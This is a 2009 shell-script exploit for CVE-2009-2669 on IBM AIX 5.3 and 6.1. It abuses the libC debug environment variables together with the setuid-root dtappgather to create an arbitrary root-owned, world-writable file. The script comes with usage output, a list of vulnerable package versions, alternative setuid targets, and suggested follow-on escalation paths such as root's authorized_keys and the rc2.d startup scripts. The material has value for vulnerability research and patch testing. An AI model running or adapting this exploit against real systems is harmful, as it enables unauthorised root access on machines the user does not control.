#!/bin/sh

#
# $Id: raptor_libC,v 1.1 2009/09/10 15:08:04 raptor Exp $
#
# raptor_libC - AIX arbitrary file overwrite via libC debug
# Copyright (c) 2009 Marco Ivaldi <raptor@mediaservice.net>
#
# Property of @ Mediaservice.net Srl Data Security Division
# http://www.mediaservice.net/ http://lab.mediaservice.net/
#
# *** DON'T RUN THIS UNLESS YOU KNOW WHAT YOU ARE DOING ***
#
# A certain debugging component in IBM AIX 5.3 and 6.1 does not properly handle
# the (1) _LIB_INIT_DBG and (2) _LIB_INIT_DBG_FILE environment variables, which
# allows local users to gain privileges by leveraging a setuid-root program to
# create an arbitrary root-owned file with world-writable permissions, related
# to libC.a (aka the XL C++ runtime library) in AIX 5.3 and libc.a in AIX 6.1
# (CVE-2009-2669).
#
# Typical privilege escalation techniques via arbitrary file creation don't
# seem to work on recent AIX versions: .rhosts is ignored if it is group or
# world writable; LIBPATH and LDR_PRELOAD have no effect for setuid binaries;
# /var/spool/cron/atjobs seems useless as well, since we cannot open cron's
# named pipe /var/adm/cron/FIFO. Other viable exploitation vectors that come
# to mind, depending on the target box setup, are: /root/.ssh/authorized_keys,
# /root/{.profile,.kshrc}, and /etc/rc.d/rc2.d.
#
# See also: http://milw0rm.com/exploits/9306
#
# Usage:
# $ uname -a
# AIX rs6000 3 5 0052288E4C00
# $ lslpp -L xlC.rte | grep xlC.rte
# xlC.rte                    9.0.0.1    C     F    XL C/C++ Runtime
# $ chmod +x raptor_libC
# $ ./raptor_libC /bin/bobobobobob
# [...]
# -rw-rw-rw-   1 root     staff            63 Sep 10 09:55 /bin/bobobobobob
#
# Vulnerable platforms (AIX 5.3):
# xlC.rte < 8.0.0.0		[untested]
# xlC.rte 8.0.0.0-8.0.0.14	[untested]
# xlC.rte 9.0.0.0-9.0.0.9	[tested]
# xlC.rte 10.1.0.0-10.1.0.2	[untested]
#
# Vulnerable platforms (AIX 6.1):
# bos.rte.libc 6.1.0.0-6.1.0.11	[untested]
# bos.rte.libc 6.1.1.0-6.1.1.6	[untested]
# bos.rte.libc 6.1.2.0-6.1.2.5	[untested]
# bos.rte.libc 6.1.3.0-6.1.3.2	[untested]
# bos.adt.prof 6.1.0.0-6.1.0.10	[untested]
# bos.adt.prof 6.1.1.0-6.1.1.5	[untested]
# bos.adt.prof 6.1.2.0-6.1.2.4	[untested]
# bos.adt.prof 6.1.3.0-6.1.3.1	[untested]
#

echo "raptor_libC - AIX arbitrary file overwrite via libC debug"
echo "Copyright (c) 2009 Marco Ivaldi <raptor@mediaservice.net>"
echo

# check the arguments
if [ -z "$1" ]; then
	echo "*** DON'T RUN THIS UNLESS YOU KNOW WHAT YOU ARE DOING ***"
	echo
	echo "Usage: $0 <filename>"
	echo
	exit
fi

# prepare the environment
_LIB_INIT_DBG=1
_LIB_INIT_DBG_FILE=$1
export _LIB_INIT_DBG _LIB_INIT_DBG_FILE

# gimme -rw-rw-rw-!
umask 0

# setuid program linked to /usr/lib/libC.a
/usr/dt/bin/dtappgather

# other good setuid targets
# /usr/dt/bin/dtprintinfo
# /opt/IBMinvscout/bin/invscoutClient_VPD_Survey

# check the created file
ls -l $_LIB_INIT_DBG_FILE
echo

# milw0rm.com [2009-09-11]